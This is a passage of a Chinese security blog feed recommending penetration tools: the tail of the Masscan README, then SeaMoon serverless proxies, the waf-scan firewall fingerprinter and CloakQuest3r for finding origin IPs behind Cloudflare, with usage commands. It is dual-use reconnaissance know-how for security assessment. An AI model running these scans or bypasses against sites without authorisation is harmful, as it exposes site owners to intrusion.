title="安全码"></a>安全码</h2><p>针对漏洞提供赏金，请参阅 VULNINFO.md 文件以获取更多信息。</p><p>该项目使用诸如 之类的安全函数，<code>safe_strcpy()</code>而不是诸如 之类的不安全函数<code>strcpy()</code>。</p><p>该项目具有自动化单元回归测试 ( <code>make regress</code>)。</p><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>我们付出了很多努力来使输入/输出看起来像<code>nmap</code>，每个进行端口扫描的人都（或应该）熟悉这一点。</p><h2 id="IPv6-和-IPv4-共存"><a href="#IPv6-和-IPv4-共存" class="headerlink" title="IPv6 和 IPv4 共存"></a>IPv6 和 IPv4 共存</h2><p>Masscan支持IPv6，但没有特殊模式，两者同时支持。（没有<code>-6</code>选择——它总是可用的）。</p><p>在您看到的 Masscan 使用的任何示例中，只需将 IPv6 地址放在您看到的 IPv4 地址处即可。您可以在同一扫描中同时包含 IPv4 和 IPv6 地址。输出包括同一位置的适当地址，没有特殊标记。</p><p>请记住，IPv6 地址空间非常大。您可能不想扫描大范围，除了通过 DHCPv6 分配的子网的前 64k 地址。</p><p>相反，您可能需要扫描<code>--include-file filename.txt</code>从其他来源获得的文件 ( ) 中存储的大量地址列表。与其他地方一样，此文件可以包含 IPv4 和 IPv6 地址的列表。我使用的测试文件包含 800 万个地址。该大小的文件在启动时需要额外几秒钟的时间来读取（masscan 在扫描之前对地址进行排序并删除重复项）。</p><p>请记住，masscan 包含其自己的网络堆栈。因此，运行 Masscan 的本地计算机不需要启用 IPv6——尽管本地网络需要能够路由 IPv6 数据包。</p><h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p>要获得超过 200 万个数据包/秒，您需要一个 Intel 10-gbps 以太网适配器和一个来自 ntop 的名为<a href="http://www.ntop.org/products/packet-capture/pf_ring/pf_ring-zc-zero-copy/">“PF_RING ZC”</a>的特殊驱动程序。无需重建 Masscan 即可使用 PF_RING。要使用 PF_RING，您需要构建以下组件：</p><ul><li><code>libpfring.so</code>（安装在/usr/lib/libpfring.so中）</li><li><code>pf_ring.ko</code>（他们的内核驱动程序）</li><li><code>ixgbe.ko</code>（他们的 Intel 10-gbps 以太网驱动程序版本）</li></ul><p>您不需要构建他们的版本<code>libpcap.so</code>。</p><p>当 Masscan 检测到适配器的名称类似于 时<code>zc:enp1s0</code>，<code>enp1s0</code>它会自动切换到 PF_RING ZC 模式。</p><p><strong>更详细的讨论可以在PoC||GTFO 0x15</strong>中找到。</p><h2 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h2><p>该项目包含一个内置的单元测试：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make test</span><br><span class="line">bin/masscan --selftest</span><br><span class="line">selftest: success!</span><br></pre></td></tr></tbody></table></figure><p>这测试了代码的许多棘手部分。您应该在构建后执行此操作。</p><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>要测试性能，请对一次性地址运行类似以下内容，以避免本地路由器过载：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11</span><br></pre></td></tr></tbody></table></figure><p>伪造者<code>--router-mac</code>将数据包保留在本地网段上，这样它们就不会传到互联网上。</p><p>您还可以在“离线”模式下进行测试，这是程序在没有传输开销的情况下运行的速度：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/masscan 0.0.0.0/4 -p80 --rate 100000000 --offline</span><br></pre></td></tr></tbody></table></figure><p>第二个基准测试大致显示了如果使用 PF_RING 程序的运行速度，其开销几乎为零。</p><p>顺便说一句，随机化算法大量使用“整数算术”，这是 CPU 上长期缓慢的运算。现代 CPU 已将执行此计算的速度提高了一倍，速度<code>masscan</code>更快。</p><h1 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h1><p>该工具由 Robert Graham 创建：电子邮件：<a href="mailto:robert_david_graham@yahoo.com">robert_david_graham@yahoo.com</a> 推特：@ErrataRob</p><h1 id="执照"><a href="#执照" class="headerlink" title="执照"></a>执照</h1><p>版权所有 (c) 2013 罗伯特·大卫·格雷厄姆</p><p>该程序是免费软件：您可以根据自由软件基金会发布的 GNU Affero 通用公共许可证（许可证版本 3）的条款重新分发和/或修改它。</p><p>分发此程序的目的是希望它有用，但不提供任何保证；甚至没有适销性或特定用途适用性的默示保证。有关更多详细信息，请参阅 GNU Affero 通用公共许可证。</p><p>您应该随该程序一起收到 GNU Affero 通用公共许可证的副本。如果没有，请参阅<a href="https://www.gnu.org/licenses/%E3%80%82">https://www.gnu.org/licenses/。</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sea Moon-月海-web端的渗透工具</title>
      <link href="/2024/02/29/46-%E6%9C%88%E6%B5%B7-web%E7%AB%AF%E7%9A%84%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/02/29/46-%E6%9C%88%E6%B5%B7-web%E7%AB%AF%E7%9A%84%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>收藏网址:yancy77.cn 不定期更新各种资源哦~</p><h1 id="Sea-Moon"><a href="#Sea-Moon" class="headerlink" title="Sea Moon"></a>Sea Moon</h1><p><a href="https://camo.githubusercontent.com/272b6fdc9a65aa14d8f43f6d5556506c2ee408cd28b448b078c454095195c526/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f44564b756e696f6e2f5365614d6f6f6e"><img src="https://camo.githubusercontent.com/272b6fdc9a65aa14d8f43f6d5556506c2ee408cd28b448b078c454095195c526/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f44564b756e696f6e2f5365614d6f6f6e" alt="img"></a> <a href="https://camo.githubusercontent.com/59142727e1bd050cb7810f42bd0489fcc79f32fba6d4b84f6eaa86fb393d96ed/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f44564b756e696f6e2f5365614d6f6f6e2e737667"><img src="https://camo.githubusercontent.com/59142727e1bd050cb7810f42bd0489fcc79f32fba6d4b84f6eaa86fb393d96ed/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f44564b756e696f6e2f5365614d6f6f6e2e737667" alt="stars"></a> <a href="https://camo.githubusercontent.com/3295603b1ddf3e870711d982eddf6622a0fcd98b0e6831c6d683f5cf57d78065/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f64766b756e696f6e2f7365616d6f6f6e2f746f74616c3f636f6c6f723d6f72616e6765"><img src="https://camo.githubusercontent.com/3295603b1ddf3e870711d982eddf6622a0fcd98b0e6831c6d683f5cf57d78065/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f64766b756e696f6e2f7365616d6f6f6e2f746f74616c3f636f6c6f723d6f72616e6765" alt="downloads"></a> <a href="https://camo.githubusercontent.com/8ab6a929468fc45a74a4fdb7cfb0d75ee5fd575ffce30479a51c383d11d86752/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c616e6775616765732f746f702f44564b756e696f6e2f5365614d6f6f6e2e7376673f26636f6c6f723d626c756576696f6c6574"><img src="https://camo.githubusercontent.com/8ab6a929468fc45a74a4fdb7cfb0d75ee5fd575ffce30479a51c383d11d86752/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c616e6775616765732f746f702f44564b756e696f6e2f5365614d6f6f6e2e7376673f26636f6c6f723d626c756576696f6c6574" alt="languages"></a> <a href="https://camo.githubusercontent.com/f43b0a2e44b515aaac8e2bd73a0c83eb9294804afa1f547c0a50aec726815b97/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c4943454e53452d4d49542d3737373737372e737667"><img src="https://camo.githubusercontent.com/f43b0a2e44b515aaac8e2bd73a0c83eb9294804afa1f547c0a50aec726815b97/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c4943454e53452d4d49542d3737373737372e737667" alt="license"></a></p><p>月海(Sea Moon) 是一款 FaaS/BaaS 实现的 Serverless 网络工具集，期望利用云原生的优势，实现更简单、更便宜的网络功能。</p><p>月海之名取自于苏轼的《西江月·顷在黄州》，寓意月海取自于传统工具，用之于云，最终达到隐匿于海的效果。</p><h2 id="☁️-什么是月海"><a href="#☁️-什么是月海" class="headerlink" title="☁️ 什么是月海"></a>☁️ 什么是月海</h2><blockquote><p>🌕 月出于云却隐于海</p></blockquote><p>月海(Sea Moon) 是一款 FaaS/BaaS 实现的 Serverless 网络工具集，期望利用云原生的优势，实现更简单、更便宜的网络功能。</p><p>月海之名取自于苏轼的《西江月·顷在黄州》，寓意月海取自于传统工具，用之于云，最终达到隐匿于海的效果。</p><p>月海基于 Serverless 的动态特性、分别从网络层、应用层实现对应的能力，并利用serverless-devs工具来实现快捷的部署/跨厂商操作。</p><p>想要了解更多，请移步 <a href="https://seamoon.dvkunion.cn/">官方手册</a></p><p>觉得项目不错的话，<a href="https://github.com/DVKunion/SeaMoon">还请给一个star ✨</a>, 你的支持是更新的最大动力～</p><h2 id="🕹-快速开始"><a href="#🕹-快速开始" class="headerlink" title="🕹 快速开始"></a>🕹 快速开始</h2><p><a href="https://seamoon.dvkunion.cn/guide/start">⚡️ 快速开始</a></p><p><a href="https://seamoon.dvkunion.cn/guide/deploy/render">✨ 新增Render部署, <del>完全免费的套餐且功能不减！！！</del> 免费但是封号的SB</a></p><p><a href="https://seamoon.dvkunion.cn/guide/deploy/sealos">✨ 新增Sealos部署, 价格更低更实惠！</a></p><p><a href="https://seamoon.dvkunion.cn/guide/client/tor/">🔥 新增 seamoon 支持 tor 网络访问 onion 域名</a></p><h2 id="🧭-支持平台"><a href="#🧭-支持平台" class="headerlink" title="🧭 支持平台"></a>🧭 支持平台</h2><table><thead><tr><th>平台名称</th><th>免费力度</th><th>是否支持</th><th>部署文档</th></tr></thead><tbody><tr><td>阿里云</td><td>新用户三个月</td><td>✅</td><td><a href="https://seamoon.dvkunion.cn/guide/deploy/aliyun">部署</a></td></tr><tr><td>腾讯云</td><td>🈚️</td><td>✅</td><td><a href="https://seamoon.dvkunion.cn/guide/deploy/tencent">部署</a></td></tr><tr><td>🔥Sealos</td><td>五元余额，流量不计费</td><td>✅</td><td><a href="https://seamoon.dvkunion.cn/guide/deploy/sealos">部署</a></td></tr><tr><td>🙅Render</td><td><del>每月750小时免费 + 100G流量</del>但是封号</td><td>✅</td><td><a href="https://seamoon.dvkunion.cn/guide/deploy/render">部署</a></td></tr><tr><td>华为云</td><td></td><td>✅</td><td><a href="https://github.com/DVKunion/SeaMoon/blob/main">部署</a></td></tr><tr><td>百度云</td><td></td><td>✅</td><td><a href="https://github.com/DVKunion/SeaMoon/blob/main">部署</a></td></tr><tr><td>AWS</td><td></td><td>🐷调研中</td><td><a href="https://github.com/DVKunion/SeaMoon/blob/main">部署</a></td></tr><tr><td>Google</td><td></td><td>🐷调研中</td><td><a href="https://github.com/DVKunion/SeaMoon/blob/main">部署</a></td></tr></tbody></table><h2 id="🔥-使用展示"><a href="#🔥-使用展示" class="headerlink" title="🔥 使用展示"></a>🔥 使用展示</h2><p><a href="https://camo.githubusercontent.com/e15c676e88b2bc67aea2d24980ac26c2ec8e75381282d606b75194af0dce19ac/68747470733a2f2f7365616d6f6f6e2e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f30646433376635363030333634653539613934353765333865616637376231662e706e67"><img src="https://camo.githubusercontent.com/e15c676e88b2bc67aea2d24980ac26c2ec8e75381282d606b75194af0dce19ac/68747470733a2f2f7365616d6f6f6e2e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f30646433376635363030333634653539613934353765333865616637376231662e706e67" alt="client"></a></p><h2 id="🔨-功能简要"><a href="#🔨-功能简要" class="headerlink" title="🔨 功能简要"></a>🔨 功能简要</h2><p><strong>网络隧道</strong></p><table><thead><tr><th>隧道类型</th><th>技术文档</th><th>支持情况</th></tr></thead><tbody><tr><td>websockst</td><td></td><td>✅</td></tr><tr><td>grpc</td><td></td><td>✅</td></tr></tbody></table><p><strong>网络代理</strong></p><table><thead><tr><th>代理类型</th><th>技术文档</th><th>Seamoon 客户端支持</th><th>其他客户端支持</th></tr></thead><tbody><tr><td>HTTP(S)</td><td><a href="https://seamoon.dvkunion.cn/tech/net/http/">HTTP.md</a></td><td>✅</td><td>✅</td></tr><tr><td>Socks5</td><td><a href="https://seamoon.dvkunion.cn/tech/net/socks5/">Socks5.md</a></td><td>✅</td><td>✅</td></tr><tr><td>Socks4</td><td></td><td>❌</td><td>✅</td></tr><tr><td>shadowsocks</td><td></td><td>❌</td><td>✅</td></tr></tbody></table><p><strong>其他</strong></p><ul><li>🧅 Tor 网络 .onion 支持. <a href="https://seamoon.dvkunion.cn/guide/client/tor/">如何开启 Tor 代理</a></li><li>……</li></ul><h2 id="💻-技术文档"><a href="#💻-技术文档" class="headerlink" title="💻 技术文档"></a>💻 技术文档</h2><p><a href="https://seamoon.dvkunion.cn/tech/feature">🧑‍💻 技术文档</a></p><h2 id="❗-免责声明"><a href="#❗-免责声明" class="headerlink" title="❗ 免责声明"></a>❗ 免责声明</h2><p>本工具仅用于学习serverless以及云原生相关技术，请勿用于其他用途。</p><p>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p><h2 id="☎️-联系方式"><a href="#☎️-联系方式" class="headerlink" title="☎️ 联系方式"></a>☎️ 联系方式</h2><p>Serverless in Cybersecurity 讨论微信群:</p><p>也可以在 项目 Discuss 处发起讨论。</p><h2 id="✨-CTStack"><a href="#✨-CTStack" class="headerlink" title="✨ CTStack"></a>✨ CTStack</h2><p><a href="https://camo.githubusercontent.com/dfd1e9d543bf03ba9f9853c68d9986762b306c8301ba13c1674142372e8c9577/68747470733a2f2f6374737461636b2d6f73732e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f4354253230537461636b2d322e706e67"><img src="https://camo.githubusercontent.com/dfd1e9d543bf03ba9f9853c68d9986762b306c8301ba13c1674142372e8c9577/68747470733a2f2f6374737461636b2d6f73732e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f4354253230537461636b2d322e706e67" alt="img"></a></p><p>SeaMoon 现已加入 <a href="https://stack.chaitin.com/tool/detail?id=186">CTStack</a> 社区</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>waf-scan-多线程批量识别WAF!</title>
      <link href="/2024/02/27/30-waf-scan!%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AF%86%E5%88%AB%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2024/02/27/30-waf-scan!%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AF%86%E5%88%AB%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<h1 id="01-waf-scan"><a href="#01-waf-scan" class="headerlink" title="01. waf-scan"></a>01. waf-scan</h1><blockquote><p>前言：基于wafw00f的插件内容，实现多线程批量识别版本。</p><p>批量识别waf防火墙.</p><p>​如何运行的?</p><ul><li>发送<em>正常的</em>HTTP请求并分析响应；这确定了许多 WAF 解决方案。</li><li>如果不成功，它会发送许多（可能是恶意的）HTTP 请求，并使用简单的逻辑来推断它是哪个 WAF。</li><li>如果也不成功，它会分析之前返回的响应，并使用另一种简单的算法来猜测 WAF 或安全解决方案是否正在积极响应我们的攻击。</li></ul></blockquote><h2 id="1-1-Usage"><a href="#1-1-Usage" class="headerlink" title="1.1. Usage"></a>1.1. Usage</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 对单个目标进行扫描 #</span><br><span class="line">python waf-scan.py -t https://example.com</span><br><span class="line"></span><br><span class="line"># 对多个目标进行扫描 #</span><br><span class="line">python waf-scan.py -f targets.txt</span><br><span class="line"></span><br><span class="line"># 结果输出 #</span><br><span class="line">`/report/`目录下会生成对应目标的json结果文件。</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/jammny/waf-scan/blob/master/img.png"><img src="https://github.com/jammny/waf-scan/raw/master/img.png" alt="img.png"></a></p><h2 id="1-2-程序兼容性"><a href="#1-2-程序兼容性" class="headerlink" title="1.2. 程序兼容性"></a>1.2. 程序兼容性</h2><p>python版本 &gt;= 3.8.0</p><h2 id="1-3-Update"><a href="#1-3-Update" class="headerlink" title="1.3. Update"></a>1.3. Update</h2><table><thead><tr><th>更新时间（版本）</th><th>更新内容</th><th>备注</th></tr></thead><tbody><tr><td>2023.8.15(v0.0.1)</td><td>内测版本</td><td>有问题联系我</td></tr></tbody></table><h2 id="1-4-Github链接"><a href="#1-4-Github链接" class="headerlink" title="1.4 Github链接"></a>1.4 Github链接</h2><p><a href="https://github.com/jammny/waf-scan">https://github.com/jammny/waf-scan</a></p><h2 id="1-5-下载命令"><a href="#1-5-下载命令" class="headerlink" title="1.5 下载命令"></a>1.5 下载命令</h2><p>git clone <a href="https://github.com/jammny/waf-scan.git">https://github.com/jammny/waf-scan.git</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloakQuest3r-寻找服务器真实IP地址.</title>
      <link href="/2024/02/25/10-CloakQuest3r-%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP,%E7%BB%95%E8%BF%87%E8%8C%83%E6%B9%96/"/>
      <url>/2024/02/25/10-CloakQuest3r-%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP,%E7%BB%95%E8%BF%87%E8%8C%83%E6%B9%96/</url>
      
        <content type="html"><![CDATA[<h2 id="CloakQuest3r-绕过防护-获取真实IP地址-而且还是爆破子域名最快的工具"><a href="#CloakQuest3r-绕过防护-获取真实IP地址-而且还是爆破子域名最快的工具" class="headerlink" title="CloakQuest3r -绕过防护-获取真实IP地址.而且还是爆破子域名最快的工具?"></a>CloakQuest3r -绕过防护-获取真实IP地址.而且还是爆破子域名最快的工具?</h2><p>CloakQuest3r 是一款功能强大的 Python 工具，经过精心设计，可揭示由 Cloudflare 和其他替代方案（一项广泛采用的 Web 安全和性能增强服务）保护的网站的真实 IP 地址。其核心任务是准确识别隐藏在 Cloudflare 防护罩后面的 Web 服务器的实际 IP 地址。子域扫描被用作实现这一目标的关键技术。对于寻求执行全面安全评估并识别可能被 Cloudflare 安全措施掩盖的漏洞的渗透测试人员、安全专业人员和 Web 管理员来说，该工具是宝贵的资源。</p><p><strong>主要特征：</strong></p><ul><li><strong>真实 IP 检测：</strong> CloakQuest3r 擅长发现使用 Cloudflare 服务的 Web 服务器的真实 IP 地址。这一关键信息对于进行全面的渗透测试和确保网络资产的安全至关重要。</li><li><strong>子域扫描：</strong>子域扫描是查找真实 IP 地址过程中的基本组成部分。它有助于识别负责托管网站及其相关子域的实际服务器。</li><li><strong>IP 地址历史记录：</strong>检索给定域的历史 IP 地址信息。它使用 ViewDNS 服务来获取和显示 IP 地址、位置、所有者和上次查看日期等详细信息。</li><li><strong>SSL 证书分析：</strong>提取并分析与目标域关联的 SSL 证书。这可以提供有关托管基础设施的附加信息，并有可能泄露真实的 IP 地址。</li><li><strong>SecurityTrails API（可选）：</strong> 如果您将免费的 SecurityTrails API 密钥添加到 config.ini 文件中，则可以从 SecurityTrails 检索历史 IP 信息。</li><li><strong>线程扫描：</strong>为了提高效率并加快真实 IP 检测过程，CloakQuest3r 使用线程。此功能可以扫描大量子域列表，而无需显着延长执行时间。</li><li><strong>详细报告：</strong>该工具提供全面的输出，包括扫描的子域总数、找到的子域总数以及扫描所需的时间。在此过程中公开的任何真实 IP 地址也会被显示，以便于深入分析和渗透测试。</li></ul><p>借助 CloakQuest3r，您可以自信地评估网站安全性、发现隐藏的漏洞，并通过公开隐藏在 Cloudflare 保护层后面的真实 IP 地址来保护您的 Web 资产。</p><h4 id="特色："><a href="#特色：" class="headerlink" title="特色："></a>特色：</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CloakQuest3r``Top 20 Most Popular Hacking Tools`是2023 年的其中之一`KitPloit</span><br></pre></td></tr></tbody></table></figure><ul><li><a href="https://www.kitploit.com/2023/12/top-20-most-popular-hacking-tools-in.html">2023 年 20 种最受欢迎的黑客工具</a></li></ul><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Sometimes it can't detect the real Ip.</span><br><span class="line"></span><br><span class="line">- CloakQuest3r combines multiple indicators to uncover real IP addresses behind Cloudflare. While subdomain scanning is a part of the process, we do not assume that all subdomains' A records point to the target host. The tool is designed to provide valuable insights but may not work in every scenario. We welcome any specific suggestions for improvement.</span><br><span class="line"></span><br><span class="line">- We created a proof of concept, but it's not well-written. We welcome pull requests to improve it.</span><br><span class="line"></span><br><span class="line">1. False Negatives: CloakReveal3r may not always accurately identify the real IP address behind Cloudflare, particularly for websites with complex network configurations or strict security measures.</span><br><span class="line"></span><br><span class="line">2. Dynamic Environments: Websites' infrastructure and configurations can change over time. The tool may not capture these changes, potentially leading to outdated information.</span><br><span class="line"></span><br><span class="line">3. Subdomain Variation: While the tool scans subdomains, it doesn't guarantee that all subdomains' A records will point to the primary host. Some subdomains may also be protected by Cloudflare.</span><br></pre></td></tr></tbody></table></figure><h4 id="该工具是概念验证，仅用于教育目的。"><a href="#该工具是概念验证，仅用于教育目的。" class="headerlink" title="该工具是概念验证，仅用于教育目的。"></a>该工具是概念验证，仅用于教育目的。</h4><hr><h4 id="操作系统兼容性："><a href="#操作系统兼容性：" class="headerlink" title="操作系统兼容性：     "></a>操作系统兼容性：  <a href="https://camo.githubusercontent.com/0825e0d13a2e355ab5aa1ccc2773878bb7089111646767276f0b621bae2eb403/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f57696e646f77732d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d77696e646f7773"><img src="https://camo.githubusercontent.com/0825e0d13a2e355ab5aa1ccc2773878bb7089111646767276f0b621bae2eb403/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f57696e646f77732d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d77696e646f7773" alt="img"></a> <a href="https://camo.githubusercontent.com/9c344f779907c0d4267caa574f27fe72819712469967f411e6db7cc5a07c5a68/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c696e75782d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d6c696e7578"><img src="https://camo.githubusercontent.com/9c344f779907c0d4267caa574f27fe72819712469967f411e6db7cc5a07c5a68/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c696e75782d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d6c696e7578" alt="img"></a> <a href="https://camo.githubusercontent.com/c5e66de293ad5e36c75502d4e9b6bc21e7e10c6c80a5081fa041adc334c5a367/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f416e64726f69642d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d616e64726f6964"><img src="https://camo.githubusercontent.com/c5e66de293ad5e36c75502d4e9b6bc21e7e10c6c80a5081fa041adc334c5a367/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f416e64726f69642d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d616e64726f6964" alt="img"></a> <a href="https://camo.githubusercontent.com/4d89a67864d198e1a612a51a1b2c2e7d938628c6e5152fd1a8d4c3c97f41808e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6d61634f532d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d6d61636f73"><img src="https://camo.githubusercontent.com/4d89a67864d198e1a612a51a1b2c2e7d938628c6e5152fd1a8d4c3c97f41808e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6d61634f532d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d6d61636f73" alt="img"></a></h4><h4 id="要求："><a href="#要求：" class="headerlink" title="要求：   "></a>要求：  <a href="https://camo.githubusercontent.com/72cc453bfaa3fb96883c90c6421df75856d4248fc7373d7e564c989143f8bf7f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d707974686f6e"><img src="https://camo.githubusercontent.com/72cc453bfaa3fb96883c90c6421df75856d4248fc7373d7e564c989143f8bf7f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d707974686f6e" alt="img"></a> <a href="https://camo.githubusercontent.com/e2359785a0e6de4231c6bfa16b8bcddb08127c9268928869c432cc0fd2fe1086/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4769742d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d676974"><img src="https://camo.githubusercontent.com/e2359785a0e6de4231c6bfa16b8bcddb08127c9268928869c432cc0fd2fe1086/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4769742d3035313232413f7374796c653d666f722d7468652d6261646765266c6f676f3d676974" alt="img"></a></h4><p><strong>如何使用：</strong></p><ol><li><p>使用单个命令行参数运行 CloudScan：您要分析的目标域。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/spyboy-productions/CloakQuest3r.git</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd CloakQuest3r</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure><p>如果是电脑上有两个python环境,2和3.则命令更换为<br>python3 -m pip install -r requirements.txt</p><p><code>For Termux(android) User``cryptography</code>如果使用requirements.txt安装时遇到问题，请使用下面给出的命令</p><p><code>pkg install python-cryptography</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cloakquest3r.py example.com</span><br></pre></td></tr></tbody></table></figure></li><li><p>该工具将检查网站是否使用 Cloudflare。如果没有，它会通知您并询问您是否仍要继续。</p></li><li><p>如果检测到 Cloudflare，它会首先打印历史 IP 记录，然后扫描子域并识别其真实 IP 地址。</p></li><li><p>您将收到详细的输出，包括扫描的子域数量、找到的子域总数以及扫描所需的时间。</p></li><li><p>任何找到的真实IP地址都会显示出来，以便您进行进一步的分析和渗透测试。</p></li></ol><p>它通过提供清晰、有组织且内容丰富的报告，简化了评估网站安全的过程。使用它来增强您的安全评估、识别潜在漏洞并保护您的网络资产。</p><hr><p><strong>可选</strong>：<a href="https://securitytrails.com/">SecurityTrails API</a></p><p>从 SecurityTrails 检索历史 IP 信息。如果您有 API 密钥，请将其添加到配置文件 (config.ini) 中。</p><p>初次执行脚本时，它会生成一个包含以下内容的 config.ini 文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">securitytrails_api_key = your_api_key</span><br></pre></td></tr></tbody></table></figure><p>随后，该脚本尝试从 SecurityTrails API 检索数据。如果由于配额限制或站点不可用等原因导致检索失败，则会优雅地跳过相应的功能。</p><hr><h4 id="在-replit-com-上在线运行"><a href="#在-replit-com-上在线运行" class="headerlink" title="在 replit.com 上在线运行"></a>在 replit.com 上在线运行</h4><p>这只是一个演示，并非所有功能都可用。请安装该工具以充分发挥其潜力。</p><p><a href="https://replit.com/@spyb0y/CloakQuest3r"><img src="https://camo.githubusercontent.com/373b6e697b06b2d984b47d282c2f9d62cbb41c9270b734844ec2aba160de06b5/68747470733a2f2f7265706c2e69742f62616467652f6769746875622f737079626f792d70726f64756374696f6e732f436c6f616b51756573743372" alt="在 Repl.it 上运行"></a></p><hr><h4 id="贡献："><a href="#贡献：" class="headerlink" title="贡献："></a>贡献：</h4><p>欢迎贡献和功能请求！如果您遇到任何问题或有改进的想法，请随时提出问题或提交拉取请求。</p><h4 id="😴🥱😪💤待办事项："><a href="#😴🥱😪💤待办事项：" class="headerlink" title="😴🥱😪💤待办事项："></a>😴🥱😪💤待办事项：</h4><ul><li>在子域扫描之前要求用户提供自定义子域单词列表，如果用户没有，则使用默认的子域单词列表。</li><li>通过网站 API 调用 (POC) 发现 IP</li><li>将所有信息保存在 